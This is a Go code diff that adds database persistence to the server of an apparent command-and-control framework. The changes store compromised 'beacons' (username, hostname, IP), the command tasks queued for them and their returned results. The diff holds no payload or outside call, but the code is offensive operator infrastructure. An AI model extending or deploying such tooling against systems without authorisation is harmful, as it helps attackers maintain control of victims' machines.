@@ -86,6 +86,7 @@ type C2Manager struct {
 	expectedResults map[string]*ExpectedResult // key: taskID (new two-phase)
 	stagerSessions  map[string]*StagerSession  // key: clientIP
 	recentMessages  map[string]time.Time       // key: message hash, value: timestamp (deduplication)
+	db              *Database                  // Database for persistent storage
 	mutex           sync.RWMutex
 	taskCounter     int
 	debug           bool
@@ -94,9 +95,18 @@ type C2Manager struct {
 }
 
 // NewC2Manager creates a new C2 management instance with the specified configuration.
-// It initializes the beacon tracking system, task management, and sets up AES encryption.
-func NewC2Manager(debug bool, encryptionKey string, jitterConfig StagerJitter) *C2Manager {
+// It initializes the beacon tracking system, task management, sets up AES encryption,
+// and initializes the database for persistent storage.
+func NewC2Manager(debug bool, encryptionKey string, jitterConfig StagerJitter, dbPath string) *C2Manager {
 	aesKey := generateAESKey(encryptionKey)
+
+	// Initialize database
+	db, err := NewDatabase(dbPath)
+	if err != nil {
+		logf("[C2] WARNING: Failed to initialize database: %v", err)
+		logf("[C2] Running in memory-only mode (data will not persist)")
+		db = nil
+	}
 
 	c2 := &C2Manager{
 		beacons:         make(map[string]*Beacon),
@@ -105,16 +115,118 @@ func NewC2Manager(debug bool, encryptionKey string, jitterConfig StagerJitter) *
 		expectedResults: make(map[string]*ExpectedResult),
 		stagerSessions:  make(map[string]*StagerSession),
 		recentMessages:  make(map[string]time.Time),
+		db:              db,
 		taskCounter:     TaskCounterStart,
 		debug:           debug,
 		aesKey:          aesKey,
 		jitterConfig:    jitterConfig,
 	}
 
+	// Load existing beacons from database
+	if c2.db != nil {
+		if err := c2.loadBeaconsFromDB(); err != nil {
+			logf("[C2] WARNING: Failed to load beacons from database: %v", err)
+		}
+		// Load existing tasks from database
+		if err := c2.loadTasksFromDB(); err != nil {
+			logf("[C2] WARNING: Failed to load tasks from database: %v", err)
+		}
+	}
+
 	// Start cleanup goroutine
 	go c2.cleanupExpiredSessions()
+	
+	// Start periodic database sync
+	if c2.db != nil {
+		go c2.periodicDBCleanup()
+	}
 
 	return c2
+}
+
+// loadBeaconsFromDB loads existing beacons from the database into memory
+func (c2 *C2Manager) loadBeaconsFromDB() error {
+	beacons, err := c2.db.GetAllBeacons()
+	if err != nil {
+		return fmt.Errorf("failed to load beacons: %w", err)
+	}
+
+	c2.mutex.Lock()
+	defer c2.mutex.Unlock()
+
+	for _, beacon := range beacons {
+		c2.beacons[beacon.ID] = beacon
+		logf("[C2] Loaded beacon from database: %s (%s@%s)", beacon.ID, beacon.Username, beacon.Hostname)
+	}
+
+	if len(beacons) > 0 {
+		logf("[C2] Loaded %d beacon(s) from database", len(beacons))
+	}
+
+	return nil
+}
+
+// loadTasksFromDB loads existing tasks from the database into memory
+func (c2 *C2Manager) loadTasksFromDB() error {
+	tasks, err := c2.db.GetAllTasks()
+	if err != nil {
+		return fmt.Errorf("failed to load tasks: %w", err)
+	}
+
+	c2.mutex.Lock()
+	defer c2.mutex.Unlock()
+
+	// Load tasks and populate beacon task queues
+	for _, task := range tasks {
+		c2.tasks[task.ID] = task
+		
+		// Update task counter to avoid ID collisions
+		if strings.HasPrefix(task.ID, "T") {
+			if id, err := strconv.Atoi(task.ID[1:]); err == nil && id >= c2.taskCounter {
+				c2.taskCounter = id + 1
+			}
+		}
+
+		// Add pending tasks to beacon queues
+		if task.Status == "pending" {
+			if beacon, exists := c2.beacons[task.BeaconID]; exists {
+				beacon.TaskQueue = append(beacon.TaskQueue, *task)
+			}
+		}
+	}
+
+	if len(tasks) > 0 {
+		logf("[C2] Loaded %d task(s) from database", len(tasks))
+	}
+
+	return nil
+}
+
+// periodicDBCleanup performs periodic database maintenance
+func (c2 *C2Manager) periodicDBCleanup() {
+	ticker := time.NewTicker(1 * time.Hour)
+	defer ticker.Stop()
+
+	for range ticker.C {
+		if c2.db == nil {
+			return
+		}
+
+		// Clean up old completed tasks (older than 30 days by default)
+		if err := c2.db.CleanupOldData(30); err != nil {
+			if c2.debug {
+				logf("[C2] Database cleanup error: %v", err)
+			}
+		}
+
+		// Log database stats in debug mode
+		if c2.debug {
+			if stats, err := c2.db.GetDatabaseStats(); err == nil {
+				logf("[C2] DB Stats: %d beacons, %d active, %d tasks", 
+					stats["beacons"], stats["active_beacons"], stats["tasks"])
+			}
+		}
+	}
 }
 
 // calculateStagerETA calculates ETA using overall transfer rate (including pauses)
@@ -727,6 +839,15 @@ func (c2 *C2Manager) handleCheckin(parts []string, clientIP string, isDuplicate 
 	beacon.LastSeen = time.Now()
 	beacon.IPAddress = clientIP
 
+	// Save beacon to database (async to avoid blocking)
+	if c2.db != nil && !isDuplicate {
+		go func(b *Beacon) {
+			if err := c2.db.SaveBeacon(b); err != nil && c2.debug {
+				logf("[C2] Failed to save beacon to database: %v", err)
+			}
+		}(beacon)
+	}
+
 	// Only log checkins in debug mode and skip duplicates
 	if c2.debug && !isDuplicate {
 		logf("[C2] Checkin: %s (%s@%s) from %s",
@@ -743,6 +864,15 @@ func (c2 *C2Manager) handleCheckin(parts []string, clientIP string, isDuplicate 
 			storedTask.Status = "sent"
 			now := time.Now()
 			storedTask.SentAt = &now
+			
+			// Update task status in database (async)
+			if c2.db != nil {
+				go func(tid string) {
+					if err := c2.db.UpdateTaskStatus(tid, "sent"); err != nil && c2.debug {
+						logf("[C2] Failed to update task status in database: %v", err)
+					}
+				}(task.ID)
+			}
 		}
 
 		taskResponse := fmt.Sprintf("TASK|%s|%s", task.ID, task.Command)
@@ -776,6 +906,18 @@ func (c2 *C2Manager) handleResult(parts []string, isDuplicate bool) string {
 	if task, exists := c2.tasks[taskID]; exists {
 		task.Result = result
 		task.Status = "completed"
+		
+		// Save result to database (async)
+		if c2.db != nil {
+			go func(tid, bid, res string) {
+				if err := c2.db.SaveTaskResult(tid, bid, res, 0, 1); err != nil && c2.debug {
+					logf("[C2] Failed to save task result to database: %v", err)
+				}
+				if err := c2.db.UpdateTaskStatus(tid, "completed"); err != nil && c2.debug {
+					logf("[C2] Failed to update task status in database: %v", err)
+				}
+			}(taskID, beaconID, result)
+		}
 	}
 
 	return "ACK"
@@ -937,6 +1079,20 @@ func (c2 *C2Manager) handleData(parts []string, isDuplicate bool) string {
 		if task, exists := c2.tasks[taskID]; exists {
 			task.Result = result
 			task.Status = "completed"
+		}
+
+		// Save result to database (async)
+		if c2.db != nil {
+			go func(tid, bid, res string, chunks int) {
+				// Save the complete result
+				if err := c2.db.SaveTaskResult(tid, bid, res, 0, 1); err != nil && c2.debug {
+					logf("[C2] Failed to save task result to database: %v", err)
+				}
+				// Update task status
+				if err := c2.db.UpdateTaskStatus(tid, "completed"); err != nil && c2.debug {
+					logf("[C2] Failed to update task status in database: %v", err)
+				}
+			}(taskID, beaconID, result, expected.TotalChunks)
 		}
 
 		// Clean up
@@ -1151,6 +1307,15 @@ func (c2 *C2Manager) AddTask(beaconID, command string) string {
 
 	c2.tasks[taskID] = task
 
+	// Save task to database (async to avoid blocking)
+	if c2.db != nil {
+		go func(t *Task) {
+			if err := c2.db.SaveTask(t); err != nil && c2.debug {
+				logf("[C2] Failed to save task to database: %v", err)
+			}
+		}(task)
+	}
+
 	// Add to beacon's task queue
 	if beacon, exists := c2.beacons[beaconID]; exists {
 		beacon.TaskQueue = append(beacon.TaskQueue, *task)
@@ -1184,6 +1349,85 @@ func (c2 *C2Manager) GetTasks() map[string]*Task {
 		result[id] = task
 	}
 	return result
+}
+
+// GetBeaconTasks retrieves all tasks for a specific beacon from the database
+// This includes both in-memory and historical tasks
+func (c2 *C2Manager) GetBeaconTasks(beaconID string) ([]*Task, error) {
+	if c2.db == nil {
+		// Fallback to in-memory only if DB not available
+		c2.mutex.RLock()
+		defer c2.mutex.RUnlock()
+		
+		var tasks []*Task
+		for _, task := range c2.tasks {
+			if task.BeaconID == beaconID {
+				tasks = append(tasks, task)
+			}
+		}
+		return tasks, nil
+	}
+	
+	// Query from database for complete history
+	return c2.db.GetTasksForBeacon(beaconID)
+}
+
+// GetTaskHistory retrieves all tasks with optional filtering
+// Returns tasks from database for complete historical view
+func (c2 *C2Manager) GetTaskHistory(status string, limit int) ([]*Task, error) {
+	if c2.db == nil {
+		// Fallback to in-memory only if DB not available
+		c2.mutex.RLock()
+		defer c2.mutex.RUnlock()
+		
+		var tasks []*Task
+		for _, task := range c2.tasks {
+			if status == "" || task.Status == status {
+				tasks = append(tasks, task)
+				if limit > 0 && len(tasks) >= limit {
+					break
+				}
+			}
+		}
+		return tasks, nil
+	}
+	
+	// Query from database for complete history
+	if status != "" {
+		return c2.db.GetTasksByStatus(status, limit)
+	}
+	
+	// Get all tasks with limit
+	return c2.db.GetAllTasksWithLimit(limit)
+}
+
+// GetTaskWithResult retrieves a task and its result from database
+// This ensures we get the complete task data even if not in memory
+func (c2 *C2Manager) GetTaskWithResult(taskID string) (*Task, error) {
+	// First check in-memory cache
+	c2.mutex.RLock()
+	if task, exists := c2.tasks[taskID]; exists {
+		c2.mutex.RUnlock()
+		return task, nil
+	}
+	c2.mutex.RUnlock()
+	
+	// If not in memory, query from database
+	if c2.db == nil {
+		return nil, fmt.Errorf("task not found and database not available")
+	}
+	
+	task, resultData, err := c2.db.GetTaskWithResult(taskID)
+	if err != nil {
+		return nil, err
+	}
+	
+	// Populate the result field
+	if resultData != "" {
+		task.Result = resultData
+	}
+	
+	return task, nil
 }
 
 // GetExpectedResults returns a copy of expected results for console display
